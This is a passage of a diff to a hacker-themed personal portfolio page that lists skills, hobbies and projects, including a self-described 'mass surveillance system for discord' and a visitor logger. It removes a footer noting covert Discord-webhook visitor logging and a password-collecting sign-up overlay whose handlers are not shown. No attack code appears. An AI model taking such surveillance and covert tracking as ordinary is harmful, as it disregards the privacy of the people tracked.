@@ -5,7 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>gztxr :: terminal</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
             font-family: 'Courier New', Courier, monospace;
             background: #0a0a0a;
@@ -22,19 +26,24 @@
             background: #0d0d0d;
             border: 1px solid #1a1a1a;
             border-radius: 8px;
-            padding: 25px 30px 20px;
-            box-shadow: 0 0 40px rgba(0, 255, 65, 0.05);
+            padding: 30px 35px 25px;
+            box-shadow: 0 0 60px rgba(0, 255, 65, 0.03), inset 0 0 60px rgba(0, 255, 65, 0.01);
         }
         .terminal-header {
             display: flex;
             align-items: center;
             gap: 10px;
-            padding-bottom: 12px;
+            padding-bottom: 15px;
             border-bottom: 1px solid #1a1a1a;
-            margin-bottom: 18px;
+            margin-bottom: 20px;
             flex-wrap: wrap;
         }
-        .terminal-dot { width: 12px; height: 12px; border-radius: 50%; display: inline-block; }
+        .terminal-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            display: inline-block;
+        }
         .terminal-dot.red { background: #ff5f56; }
         .terminal-dot.yellow { background: #ffbd2e; }
         .terminal-dot.green { background: #27c93f; }
@@ -62,27 +71,60 @@
             box-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
             transform: scale(1.05);
         }
-        
-        .line { margin-bottom: 8px; line-height: 1.8; font-size: 14px; }
-        .prompt-symbol { color: #00ff41; font-weight: bold; }
-        .command { color: #ffffff; }
-        .output { color: #a8a8a8; padding-left: 20px; margin-bottom: 12px; }
-        .output .highlight { color: #00ff41; }
-        .output .dim { color: #555; }
-        .output .link { color: #00aaff; text-decoration: none; border-bottom: 1px dashed #00aaff33; }
-        .output .link:hover { color: #66ccff; border-bottom-color: #66ccff; }
-        .output .success { color: #00ff41; }
-        .output .warning { color: #ffaa00; }
-        .output .info { color: #00aaff; }
-        .output .error { color: #ff4444; }
+
+        .line {
+            margin-bottom: 8px;
+            line-height: 1.8;
+            font-size: 14px;
+        }
+        .prompt-symbol {
+            color: #00ff41;
+            font-weight: bold;
+        }
+        .command {
+            color: #ffffff;
+        }
+        .output {
+            color: #a8a8a8;
+            padding-left: 20px;
+            margin-bottom: 12px;
+        }
+        .output .highlight {
+            color: #00ff41;
+        }
+        .output .dim {
+            color: #555;
+        }
+        .output .link {
+            color: #00aaff;
+            text-decoration: none;
+            border-bottom: 1px dashed #00aaff33;
+        }
+        .output .link:hover {
+            color: #66ccff;
+            border-bottom-color: #66ccff;
+        }
+        .output .success {
+            color: #00ff41;
+        }
+        .output .warning {
+            color: #ffaa00;
+        }
+        .output .info {
+            color: #00aaff;
+        }
+        .output .error {
+            color: #ff4444;
+        }
         .ascii-art {
             color: #00ff41;
             font-size: 12px;
             line-height: 1.2;
-            margin: 10px 0 15px;
+            margin: 10px 0 18px;
             white-space: pre;
             opacity: 0.7;
             letter-spacing: 0.5px;
+            text-align: center;
         }
         .skill-bar {
             display: flex;
@@ -90,7 +132,11 @@
             gap: 12px;
             margin: 4px 0;
         }
-        .skill-name { color: #00ff41; min-width: 70px; font-size: 13px; }
+        .skill-name {
+            color: #00ff41;
+            min-width: 70px;
+            font-size: 13px;
+        }
         .skill-track {
             flex: 1;
             height: 14px;
@@ -106,11 +152,18 @@
             transition: width 1s ease;
             width: 0%;
         }
-        .skill-fill.rust { background: #ff6b35; }
-        .skill-percent { color: #555; font-size: 12px; min-width: 35px; text-align: right; }
+        .skill-fill.rust {
+            background: #ff6b35;
+        }
+        .skill-percent {
+            color: #555;
+            font-size: 12px;
+            min-width: 35px;
+            text-align: right;
+        }
         .hobby-tag {
             display: inline-block;
-            padding: 4px 12px;
+            padding: 4px 14px;
             border: 1px solid #1a1a1a;
             border-radius: 2px;
             color: #a8a8a8;
@@ -118,17 +171,33 @@
             margin: 3px 6px 3px 0;
             transition: all 0.3s ease;
         }
-        .hobby-tag:hover { border-color: #00ff41; color: #00ff41; background: rgba(0, 255, 65, 0.05); }
+        .hobby-tag:hover {
+            border-color: #00ff41;
+            color: #00ff41;
+            background: rgba(0, 255, 65, 0.05);
+        }
         .project-item {
             padding: 8px 12px;
             margin: 4px 0;
             border-left: 2px solid #1a1a1a;
             transition: all 0.3s ease;
         }
-        .project-item:hover { border-left-color: #00ff41; background: rgba(0, 255, 65, 0.03); }
-        .project-item .name { color: #00ff41; }
-        .project-item .desc { color: #666; font-size: 12px; }
-        .separator { border: none; border-top: 1px solid #1a1a1a; margin: 20px 0; }
+        .project-item:hover {
+            border-left-color: #00ff41;
+            background: rgba(0, 255, 65, 0.03);
+        }
+        .project-item .name {
+            color: #00ff41;
+        }
+        .project-item .desc {
+            color: #666;
+            font-size: 12px;
+        }
+        .separator {
+            border: none;
+            border-top: 1px solid #1a1a1a;
+            margin: 20px 0;
+        }
         .footer {
             color: #333;
             font-size: 11px;
@@ -138,241 +207,103 @@
             border-top: 1px solid #1a1a1a;
             letter-spacing: 0.5px;
         }
-        .signup-btn {
-            background: transparent;
-            border: 1px solid #00ff41;
-            color: #00ff41;
-            padding: 4px 16px;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            cursor: pointer;
-            border-radius: 3px;
-            transition: all 0.3s ease;
-            margin-left: 10px;
-        }
-        .signup-btn:hover { background: rgba(0, 255, 65, 0.1); box-shadow: 0 0 20px rgba(0, 255, 65, 0.1); }
-
-        /* ===== FULL SCREEN LOGIN OVERLAY ===== */
-        .login-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(10, 10, 10, 0.95);
-            backdrop-filter: blur(10px);
-            z-index: 9999;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .login-overlay.active {
-            display: flex;
-        }
-        .login-box {
-            max-width: 550px;
-            width: 100%;
-            background: #0d0d0d;
-            border: 1px solid #1a1a1a;
-            border-radius: 12px;
-            padding: 40px 50px;
-            box-shadow: 0 0 80px rgba(0, 255, 65, 0.05);
-            position: relative;
-            animation: slideUp 0.4s ease;
-        }
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .login-box .close-btn {
-            position: absolute;
-            top: 12px;
-            right: 16px;
+        .footer .heart {
             color: #ff4444;
-            font-size: 22px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            background: none;
-            border: none;
-            font-family: 'Courier New', monospace;
-            padding: 4px 10px;
-            border-radius: 4px;
-            line-height: 1;
         }
-        .login-box .close-btn:hover { 
-            color: #ff6666;
-            background: rgba(255, 68, 68, 0.1);
-            transform: scale(1.1);
-        }
-        .login-box .close-btn-label {
-            position: absolute;
-            top: 14px;
-            right: 48px;
-            color: #555;
-            font-size: 11px;
-            font-family: 'Courier New', monospace;
-            letter-spacing: 0.5px;
-        }
-        .login-box .login-ascii {
-            color: #00ff41;
-            font-size: 10px;
-            line-height: 1.2;
-            margin-bottom: 15px;
-            white-space: pre;
-            opacity: 0.6;
-            text-align: center;
-        }
-        .login-box .login-title {
-            text-align: center;
-            color: #00ff41;
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
-        .login-box .login-sub {
-            text-align: center;
-            color: #555;
-            font-size: 12px;
-            margin-bottom: 25px;
-        }
-        .login-box .auth-row {
-            margin: 8px 0;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            flex-wrap: wrap;
-        }
-        .login-box .auth-row label {
-            color: #555;
-            min-width: 80px;
-            font-size: 13px;
-        }
-        .login-box .auth-input {
-            background: transparent;
-            border: none;
-            border-bottom: 1px solid #1a1a1a;
-            color: #00ff41;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            padding: 4px 8px;
-            flex: 1;
-            min-width: 150px;
-            outline: none;
-            transition: border-color 0.3s ease;
-        }
-        .login-box .auth-input:focus { border-color: #00ff41; }
-        .login-box .auth-input::placeholder { color: #333; }
-        .login-box .auth-btn {
-            background: transparent;
-            border: 1px solid #00ff41;
-            color: #00ff41;
-            padding: 8px 30px;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            cursor: pointer;
-            border-radius: 3px;
-            transition: all 0.3s ease;
-            margin-top: 10px;
-            width: 100%;
-        }
-        .login-box .auth-btn:hover { background: rgba(0, 255, 65, 0.1); box-shadow: 0 0 30px rgba(0, 255, 65, 0.1); }
-        .login-box .auth-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        .login-box .auth-message {
-            text-align: center;
-            font-size: 13px;
-            margin-top: 10px;
-            min-height: 20px;
-        }
-        .login-box .auth-message.error { color: #ff4444; }
-        .login-box .auth-message.success { color: #00ff41; }
-        .login-box .auth-message.loading { color: #ffaa00; }
-        .login-box .auth-toggle {
-            display: block;
-            text-align: center;
-            color: #00aaff;
-            cursor: pointer;
-            text-decoration: underline;
-            font-size: 13px;
-            margin-top: 12px;
-        }
-        .login-box .auth-toggle:hover { color: #66ccff; }
-        .login-box .login-sep {
-            border: none;
-            border-top: 1px solid #1a1a1a;
-            margin: 20px 0;
-        }
-        .login-box .login-footer {
-            text-align: center;
-            color: #333;
-            font-size: 11px;
-            margin-top: 15px;
-        }
-        .login-box .login-prompt {
-            color: #00ff41;
-            font-size: 13px;
-            margin-bottom: 10px;
-            text-align: center;
-        }
-        .spinner {
+        .status-dot {
             display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid #1a1a1a;
-            border-top-color: #00ff41;
+            width: 8px;
+            height: 8px;
+            background: #00ff41;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            vertical-align: middle;
-            margin-right: 8px;
+            animation: pulse 2s infinite;
+            margin-right: 6px;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes pulse {
+            0%,
+            100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        .typing-cursor {
+            display: inline-block;
+            width: 10px;
+            height: 18px;
+            background: #00ff41;
+            animation: blink 1s infinite;
+            vertical-align: text-bottom;
+            margin-left: 2px;
+        }
+        @keyframes blink {
+            0%,
+            50% { opacity: 1; }
+            51%,
+            100% { opacity: 0; }
+        }
 
         @media (max-width: 768px) {
-            .terminal { padding: 20px 15px; }
-            .line { font-size: 12px; }
-            .output { padding-left: 10px; }
-            .ascii-art { font-size: 8px; }
-            .skill-name { min-width: 60px; font-size: 12px; }
-            .profile-pic { width: 32px; height: 32px; }
-            .login-box { padding: 30px 25px; }
-            .login-box .login-ascii { font-size: 7px; }
-            .login-box .close-btn { font-size: 18px; top: 10px; right: 12px; }
-            .login-box .close-btn-label { display: none; }
+            .terminal {
+                padding: 20px 15px;
+            }
+            .line {
+                font-size: 12px;
+            }
+            .output {
+                padding-left: 10px;
+            }
+            .ascii-art {
+                font-size: 8px;
+            }
+            .skill-name {
+                min-width: 60px;
+                font-size: 12px;
+            }
+            .profile-pic {
+                width: 32px;
+                height: 32px;
+            }
         }
         @media (max-width: 480px) {
-            .terminal { padding: 15px 10px; }
-            .line { font-size: 11px; line-height: 1.6; }
-            .ascii-art { font-size: 6px; }
-            .profile-pic { width: 28px; height: 28px; border-width: 1.5px; }
-            .login-box { padding: 25px 18px; }
-            .login-box .login-ascii { font-size: 5px; }
-            .login-box .auth-row label { min-width: 60px; font-size: 12px; }
-            .login-box .auth-input { font-size: 12px; min-width: 100px; }
-            .login-box .auth-btn { font-size: 12px; padding: 6px 20px; }
-            .login-box .close-btn { font-size: 16px; top: 8px; right: 10px; }
-            .login-box .close-btn-label { display: none; }
+            .terminal {
+                padding: 15px 10px;
+            }
+            .line {
+                font-size: 11px;
+                line-height: 1.6;
+            }
+            .ascii-art {
+                font-size: 6px;
+            }
+            .profile-pic {
+                width: 28px;
+                height: 28px;
+                border-width: 1.5px;
+            }
+            .skill-name {
+                min-width: 50px;
+                font-size: 11px;
+            }
+            .hobby-tag {
+                font-size: 11px;
+                padding: 3px 10px;
+            }
         }
     </style>
 </head>
 <body>
 
 <div class="terminal">
+    <!-- ===== HEADER ===== -->
     <div class="terminal-header">
         <span class="terminal-dot red"></span>
         <span class="terminal-dot yellow"></span>
         <span class="terminal-dot green"></span>
         <img class="profile-pic" src="https://cdn.discordapp.com/avatars/1519773053901475920/0fc8daf245c991822fa5a6178960eeae.webp?size=128" alt="gztxr" onerror="this.style.display='none'">
         <span class="terminal-title">gztxr@arch:~$</span>
-        <button class="signup-btn" onclick="openSignup()">[sign up]</button>
+        <span style="color:#333;font-size:11px;margin-left:auto;">[ v2.0 ]</span>
     </div>
 
-    <!-- ===== PROFILE CONTENT ===== -->
-    <div id="profileContent">
-        <div class="ascii-art">
+    <!-- ===== ASCII ART ===== -->
+    <div class="ascii-art">
    ▄████████    ▄████████ ████████▄     ▄████████ 
   ███    ███   ███    ███ ███   ▀███   ███    ███ 
   ███    ███   ███    ███ ███    ███   ███    █▀  
@@ -381,696 +312,224 @@
   ███    ███   ███    ███ ███    ███   ███    █▄  
   ███    ███   ███    ███ ███   ▄███   ███    ███ 
   ██████████   ██████████ ████████▀    ██████████ 
-        </div>
-        <div class="line">
-            <span class="prompt-symbol">$</span>
-            <span class="command"> whoami</span>
-        </div>
-        <div class="output">
-            <span class="highlight">gztxr</span> :: developer / gamer<br>
-            <span class="dim">os</span> :: Arch Linux x86_64<br>
-            <span class="dim">shell</span> :: zsh 5.9<br>
-            <span class="dim">editor</span> :: neovim / vscodium<br>
-            <span class="dim">uptime</span> :: 42 days<br>
-            <span class="dim">status</span> :: <span class="success">online</span>
-        </div>
-        <div class="line">
-            <span class="prompt-symbol">$</span>
-            <span class="command"> open github</span>
-        </div>
-        <div class="output">
-            <a href="https://github.com/gztxr" target="_blank" class="link">https://github.com/gztxr</a>
-            <span class="dim"> :: profile</span>
-        </div>
-        <hr class="separator">
-        <div class="line">
-            <span class="prompt-symbol">$</span>
-            <span class="command"> cat /skills/*</span>
-        </div>
-        <div class="output">
-            <div class="skill-bar">
-                <span class="skill-name">C</span>
-                <div class="skill-track">
-                    <div class="skill-fill" style="width: 75%;"></div>
-                </div>
-                <span class="skill-percent">75%</span>
+    </div>
+
+    <!-- ===== WHOAMI ===== -->
+    <div class="line">
+        <span class="prompt-symbol">$</span>
+        <span class="command"> whoami</span>
+    </div>
+    <div class="output">
+        <span class="highlight">gztxr</span> :: developer / gamer<br>
+        <span class="dim">os</span> :: Arch Linux x86_64<br>
+        <span class="dim">shell</span> :: zsh 5.9<br>
+        <span class="dim">editor</span> :: neovim / vscodium<br>
+        <span class="dim">uptime</span> :: 42 days<br>
+        <span class="dim">status</span> :: <span class="status-dot"></span><span class="success">online</span>
+    </div>
+
+    <!-- ===== GITHUB ===== -->
+    <div class="line">
+        <span class="prompt-symbol">$</span>
+        <span class="command"> open github</span>
+    </div>
+    <div class="output">
+        <a href="https://github.com/gztxr" target="_blank" class="link">https://github.com/gztxr</a>
+        <span class="dim"> :: profile</span>
+    </div>
+
+    <hr class="separator">
+
+    <!-- ===== SKILLS ===== -->
+    <div class="line">
+        <span class="prompt-symbol">$</span>
+        <span class="command"> cat /skills/*</span>
+    </div>
+    <div class="output">
+        <div class="skill-bar">
+            <span class="skill-name">C</span>
+            <div class="skill-track">
+                <div class="skill-fill" style="width: 75%;"></div>
             </div>
-            <div class="skill-bar">
-                <span class="skill-name">Python</span>
-                <div class="skill-track">
-                    <div class="skill-fill" style="width: 70%;"></div>
-                </div>
-                <span class="skill-percent">70%</span>
+            <span class="skill-percent">75%</span>
+        </div>
+        <div class="skill-bar">
+            <span class="skill-name">Python</span>
+            <div class="skill-track">
+                <div class="skill-fill" style="width: 70%;"></div>
             </div>
-            <div class="skill-bar">
-                <span class="skill-name">HTML</span>
-                <div class="skill-track">
-                    <div class="skill-fill" style="width: 85%;"></div>
-                </div>
-                <span class="skill-percent">85%</span>
+            <span class="skill-percent">70%</span>
+        </div>
+        <div class="skill-bar">
+            <span class="skill-name">HTML</span>
+            <div class="skill-track">
+                <div class="skill-fill" style="width: 85%;"></div>
             </div>
-            <div class="skill-bar">
-                <span class="skill-name">CSS</span>
-                <div class="skill-track">
-                    <div class="skill-fill" style="width: 80%;"></div>
-                </div>
-                <span class="skill-percent">80%</span>
+            <span class="skill-percent">85%</span>
+        </div>
+        <div class="skill-bar">
+            <span class="skill-name">CSS</span>
+            <div class="skill-track">
+                <div class="skill-fill" style="width: 80%;"></div>
             </div>
-            <div class="skill-bar">
-                <span class="skill-name">Rust</span>
-                <div class="skill-track">
-                    <div class="skill-fill rust" style="width: 30%;"></div>
-                </div>
-                <span class="skill-percent">30%</span>
+            <span class="skill-percent">80%</span>
+        </div>
+        <div class="skill-bar">
+            <span class="skill-name">Rust</span>
+            <div class="skill-track">
+                <div class="skill-fill rust" style="width: 30%;"></div>
             </div>
-        </div>
-        <hr class="separator">
-        <div class="line">
-            <span class="prompt-symbol">$</span>
-            <span class="command"> ls /projects/</span>
-        </div>
-        <div class="output">
-            <div class="project-item">
-                <span class="name">discord-surveillance</span><br>
-                <span class="desc">  mass surveillance system for discord</span>
-            </div>
-            <div class="project-item">
-                <span class="name">game-hacks</span><br>
-                <span class="desc">  various game modification tools</span>
-            </div>
-            <div class="project-item">
-                <span class="name">visitor-logger</span><br>
-                <span class="desc">  real-time visitor tracking with discord webhook</span>
-            </div>
-            <div class="project-item">
-                <span class="name">dotfiles</span><br>
-                <span class="desc">  arch linux configuration files</span>
-            </div>
-            <div class="project-item">
-                <span class="name">terminal-profile</span><br>
-                <span class="desc">  minimalist terminal-style portfolio</span>
-            </div>
-        </div>
-        <hr class="separator">
-        <div class="line">
-            <span class="prompt-symbol">$</span>
-            <span class="command"> cat /games/favorites</span>
-        </div>
-        <div class="output">
-            <span class="info">[+]</span> all-time favorite: <span class="highlight">Garry's Mod</span><br>
-            <span class="dim">  genres   ::</span> FPS / Sandbox / Horror<br>
-            <span class="dim">  currently ::</span> Elden Ring, Dark Souls<br>
-            <span class="dim">  favorites ::</span> Garry's Mod, Hollow Knight, RimWorld<br>
-            <span class="dim">  horror   ::</span> Outlast, Amnesia, FNAF
-        </div>
-        <hr class="separator">
-        <div class="line">
-            <span class="prompt-symbol">$</span>
-            <span class="command"> mpg123 --playlist</span>
-        </div>
-        <div class="output">
-            <span class="dim">  myagi</span>       :: <span class="highlight">underground hip-hop / rap</span><br>
-            <span class="dim">  lil peep</span>     :: <span class="highlight">emo rap / trap</span><br>
-            <span class="dim">  arctic monkeys</span> :: <span class="highlight">indie rock / post-punk revival</span><br>
-            <span class="dim">  alex g</span>       :: <span class="highlight">indie rock / lo-fi</span><br>
-            <span class="dim">  radiohead</span>    :: <span class="highlight">alternative rock / art rock</span>
-        </div>
-        <hr class="separator">
-        <div class="line">
-            <span class="prompt-symbol">$</span>
-            <span class="command"> ./dream-project --status</span>
-        </div>
-        <div class="output">
-            <span class="warning">[!]</span> <span class="highlight">Palantir-like tool</span><br>
-            <span class="dim">  massive data analytics and intelligence platform</span><br>
-            <span class="dim">  stack :: C / Rust / Python</span>
-        </div>
-        <hr class="separator">
-        <div class="line">
-            <span class="prompt-symbol">$</span>
-            <span class="command"> ls ~/hobbies/</span>
-        </div>
-        <div class="output">
-            <span class="hobby-tag">gaming</span>
-            <span class="hobby-tag">tennis</span>
-            <span class="hobby-tag">golf</span>
-            <span class="hobby-tag">coding</span>
-        </div>
-        <hr class="separator">
-        <div class="line">
-            <span class="prompt-symbol">$</span>
-            <span class="command"> ./sports --status</span>
-        </div>
-        <div class="output">
-            <span class="warning">[!]</span> Tennis: <span class="highlight">intermediate</span> <span class="dim">| 3.5 rating</span><br>
-            <span class="warning">[!]</span> Golf: <span class="highlight">beginner</span> <span class="dim">| handicap 28</span><br>
-            <span class="dim">  last match :: 2 days ago</span>
-        </div>
-        <hr class="separator">
-        <div class="line">
-            <span class="prompt-symbol">$</span>
-            <span class="command"> cat /distros/*</span>
-        </div>
-        <div class="output">
-            <span class="info">[+]</span> <span class="highlight">Arch</span> <span class="dim">|| daily driver</span><br>
-            <span class="info">[+]</span> <span class="highlight">Gentoo</span> <span class="dim">|| source-based masochism</span><br>
-            <span class="info">[+]</span> <span class="highlight">NixOS</span> <span class="dim">|| declarative config obsession</span>
-        </div>
-        <hr class="separator">
-        <div class="line">
-            <span class="prompt-symbol">$</span>
-            <span class="command"> ./why-c --explain</span>
-        </div>
-        <div class="output">
-            <span class="highlight">"C is fast and general-purpose."</span><br>
-            <span class="dim">  -- gztxr, 5 years of experience</span>
-        </div>
-        <hr class="separator">
-        <div class="line">
-            <span class="prompt-symbol">$</span>
-            <span class="command"> ./contact --methods</span>
-        </div>
-        <div class="output">
-            <span class="dim">  github  ::</span> <a href="https://github.com/gztxr" target="_blank" class="link">gztxr</a><br>
-            <span class="dim">  discord ::</span> <span class="highlight">gztxr</span><br>
-            <span class="dim">  email   ::</span> <span class="dim">gztxr@proton.me</span>
+            <span class="skill-percent">30%</span>
         </div>
     </div>
 
     <hr class="separator">
+
+    <!-- ===== PROJECTS ===== -->
+    <div class="line">
+        <span class="prompt-symbol">$</span>
+        <span class="command"> ls /projects/</span>
+    </div>
+    <div class="output">
+        <div class="project-item">
+            <span class="name">discord-surveillance</span><br>
+            <span class="desc">  mass surveillance system for discord</span>
+        </div>
+        <div class="project-item">
+            <span class="name">game-hacks</span><br>
+            <span class="desc">  various game modification tools</span>
+        </div>
+        <div class="project-item">
+            <span class="name">visitor-logger</span><br>
+            <span class="desc">  real-time visitor tracking</span>
+        </div>
+        <div class="project-item">
+            <span class="name">dotfiles</span><br>
+            <span class="desc">  arch linux configuration files</span>
+        </div>
+        <div class="project-item">
+            <span class="name">terminal-profile</span><br>
+            <span class="desc">  minimalist terminal-style portfolio</span>
+        </div>
+    </div>
+
+    <hr class="separator">
+
+    <!-- ===== GAMES ===== -->
+    <div class="line">
+        <span class="prompt-symbol">$</span>
+        <span class="command"> cat /games/favorites</span>
+    </div>
+    <div class="output">
+        <span class="info">[+]</span> all-time favorite: <span class="highlight">Garry's Mod</span><br>
+        <span class="dim">  genres   ::</span> FPS / Sandbox / Horror<br>
+        <span class="dim">  currently ::</span> Elden Ring, Dark Souls<br>
+        <span class="dim">  favorites ::</span> Garry's Mod, Hollow Knight, RimWorld<br>
+        <span class="dim">  horror   ::</span> Outlast, Amnesia, FNAF
+    </div>
+
+    <hr class="separator">
+
+    <!-- ===== MUSIC ===== -->
+    <div class="line">
+        <span class="prompt-symbol">$</span>
+        <span class="command"> mpg123 --playlist</span>
+    </div>
+    <div class="output">
+        <span class="dim">  myagi</span>       :: <span class="highlight">underground hip-hop / rap</span><br>
+        <span class="dim">  lil peep</span>     :: <span class="highlight">emo rap / trap</span><br>
+        <span class="dim">  arctic monkeys</span> :: <span class="highlight">indie rock / post-punk revival</span><br>
+        <span class="dim">  alex g</span>       :: <span class="highlight">indie rock / lo-fi</span><br>
+        <span class="dim">  radiohead</span>    :: <span class="highlight">alternative rock / art rock</span>
+    </div>
+
+    <hr class="separator">
+
+    <!-- ===== DREAM PROJECT ===== -->
+    <div class="line">
+        <span class="prompt-symbol">$</span>
+        <span class="command"> ./dream-project --status</span>
+    </div>
+    <div class="output">
+        <span class="warning">[!]</span> <span class="highlight">Palantir-like tool</span><br>
+        <span class="dim">  massive data analytics and intelligence platform</span><br>
+        <span class="dim">  stack :: C / Rust / Python</span>
+    </div>
+
+    <hr class="separator">
+
+    <!-- ===== HOBBIES ===== -->
+    <div class="line">
+        <span class="prompt-symbol">$</span>
+        <span class="command"> ls ~/hobbies/</span>
+    </div>
+    <div class="output">
+        <span class="hobby-tag">gaming</span>
+        <span class="hobby-tag">tennis</span>
+        <span class="hobby-tag">golf</span>
+        <span class="hobby-tag">coding</span>
+    </div>
+
+    <!-- ===== SPORTS ===== -->
+    <div class="line">
+        <span class="prompt-symbol">$</span>
+        <span class="command"> ./sports --status</span>
+    </div>
+    <div class="output">
+        <span class="warning">[!]</span> Tennis: <span class="highlight">intermediate</span> <span class="dim">| 3.5 rating</span><br>
+        <span class="warning">[!]</span> Golf: <span class="highlight">beginner</span> <span class="dim">| handicap 28</span><br>
+        <span class="dim">  last match :: 2 days ago</span>
+    </div>
+
+    <hr class="separator">
+
+    <!-- ===== DISTROS ===== -->
+    <div class="line">
+        <span class="prompt-symbol">$</span>
+        <span class="command"> cat /distros/*</span>
+    </div>
+    <div class="output">
+        <span class="info">[+]</span> <span class="highlight">Arch</span> <span class="dim">|| daily driver</span><br>
+        <span class="info">[+]</span> <span class="highlight">Gentoo</span> <span class="dim">|| source-based masochism</span><br>
+        <span class="info">[+]</span> <span class="highlight">NixOS</span> <span class="dim">|| declarative config obsession</span>
+    </div>
+
+    <hr class="separator">
+
+    <!-- ===== WHY C ===== -->
+    <div class="line">
+        <span class="prompt-symbol">$</span>
+        <span class="command"> ./why-c --explain</span>
+    </div>
+    <div class="output">
+        <span class="highlight">"C is fast and general-purpose."</span><br>
+        <span class="dim">  -- gztxr, 5 years of experience</span>
+    </div>
+
+    <hr class="separator">
+
+    <!-- ===== CONTACT ===== -->
+    <div class="line">
+        <span class="prompt-symbol">$</span>
+        <span class="command"> ./contact --methods</span>
+    </div>
+    <div class="output">
+        <span class="dim">  github  ::</span> <a href="https://github.com/gztxr" target="_blank" class="link">gztxr</a><br>
+        <span class="dim">  discord ::</span> <span class="highlight">gztxr</span><br>
+        <span class="dim">  email   ::</span> <span class="dim">gztxr@proton.me</span>
+    </div>
+
+    <hr class="separator">
+
+    <!-- ===== FOOTER ===== -->
     <div class="footer">
         [~] gztxr@arch :: 5 years of C :: 42d uptime<br>
-        <span style="color: #222;">visitor logging active :: discord webhook</span>
+        <span style="color:#222;">made with <span class="heart">♥</span> · pure terminal vibes</span>
     </div>
+
+    <!-- ===== TYPING CURSOR ===== -->
+    <span class="typing-cursor"></span>
 </div>
-
-<!-- ===== FULL SCREEN LOGIN OVERLAY ===== -->
-<div id="loginOverlay" class="login-overlay">
-    <div class="login-box">
-        <span class="close-btn-label">[esc]</span>
-        <button class="close-btn" onclick="closeLogin()">✕</button>
-        
-        <div class="login-ascii">
-   ▄████████    ▄████████ ████████▄     ▄████████ 
-  ███    ███   ███    ███ ███   ▀███   ███    ███ 
-  ███    ███   ███    ███ ███    ███   ███    █▀  
- ▄███▄▄▄▄██▀  ▄███▄▄▄▄██▀ ███    ███  ▄███▄▄▄     
-▀▀███▀▀▀▀▀   ▀▀███▀▀▀▀▀   ███    ███ ▀▀███▀▀▀     
-  ███    ███   ███    ███ ███    ███   ███    █▄  
-  ███    ███   ███    ███ ███   ▄███   ███    ███ 
-  ██████████   ██████████ ████████▀    ██████████ 
-        </div>
-        
-        <div class="login-title">⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯</div>
-        <div class="login-sub">⚠ private beta · waiting list access</div>
-        
-        <hr class="login-sep">
-        
-        <!-- LOGIN FORM -->
-        <div id="loginForm" style="display:none;">
-            <div class="login-prompt">$ ./login</div>
-            <div class="auth-row">
-                <label>username</label>
-                <input type="text" id="loginUsername" class="auth-input" placeholder="enter username">
-            </div>
-            <div class="auth-row">
-                <label>password</label>
-                <input type="password" id="loginPassword" class="auth-input" placeholder="enter password">
-            </div>
-            <button class="auth-btn" onclick="handleLogin()">authenticate</button>
-            <div id="loginMessage" class="auth-message"></div>
-            <div class="auth-toggle" onclick="showSignupOverlay()">[ no account? sign up ]</div>
-        </div>
-        
-        <!-- SIGNUP FORM (DEFAULT VISIBLE) -->
-        <div id="signupForm">
-            <div class="login-prompt">$ ./signup</div>
-            <div class="auth-row">
-                <label>username</label>
-                <input type="text" id="signupUsername" class="auth-input" placeholder="choose username">
-            </div>
-            <div class="auth-row">
-                <label>email</label>
-                <input type="email" id="signupEmail" class="auth-input" placeholder="your@email.com">
-            </div>
-            <div class="auth-row">
-                <label>password</label>
-                <input type="password" id="signupPassword" class="auth-input" placeholder="choose password">
-            </div>
-            <div class="auth-row">
-                <label>confirm</label>
-                <input type="password" id="signupConfirm" class="auth-input" placeholder="confirm password">
-            </div>
-            <button class="auth-btn" onclick="handleSignupOverlay()">sign up</button>
-            <div id="signupMessage" class="auth-message"></div>
-            <div class="auth-toggle" onclick="showLoginOverlay()">[ already have an account? login ]</div>
-        </div>
-        
-        <hr class="login-sep">
-        <div class="login-footer">
-            gztxr@terminal :: v2.0
-        </div>
-    </div>
-</div>
-
-<script>
-    // ============================================
-    // LOGIN OVERLAY TOGGLE
-    // ============================================
-    function openSignup() {
-        document.getElementById('loginOverlay').classList.add('active');
-        document.getElementById('loginForm').style.display = 'none';
-        document.getElementById('signupForm').style.display = 'block';
-        document.getElementById('loginMessage').textContent = '';
-        document.getElementById('signupMessage').textContent = '';
-    }
-
-    function closeLogin() {
-        document.getElementById('loginOverlay').classList.remove('active');
-        document.getElementById('loginMessage').textContent = '';
-        document.getElementById('signupMessage').textContent = '';
-        document.getElementById('loginUsername').value = '';
-        document.getElementById('loginPassword').value = '';
-        document.getElementById('signupUsername').value = '';
-        document.getElementById('signupEmail').value = '';
-        document.getElementById('signupPassword').value = '';
-        document.getElementById('signupConfirm').value = '';
-        // Reset button state
-        var btn = document.querySelector('.auth-btn');
-        if (btn) btn.disabled = false;
-    }
-
-    function showSignupOverlay() {
-        document.getElementById('loginForm').style.display = 'none';
-        document.getElementById('signupForm').style.display = 'block';
-        document.getElementById('loginMessage').textContent = '';
-        document.getElementById('signupMessage').textContent = '';
-    }
-
-    function showLoginOverlay() {
-        document.getElementById('loginForm').style.display = 'block';
-        document.getElementById('signupForm').style.display = 'none';
-        document.getElementById('signupMessage').textContent = '';
-        document.getElementById('loginMessage').textContent = '';
-    }
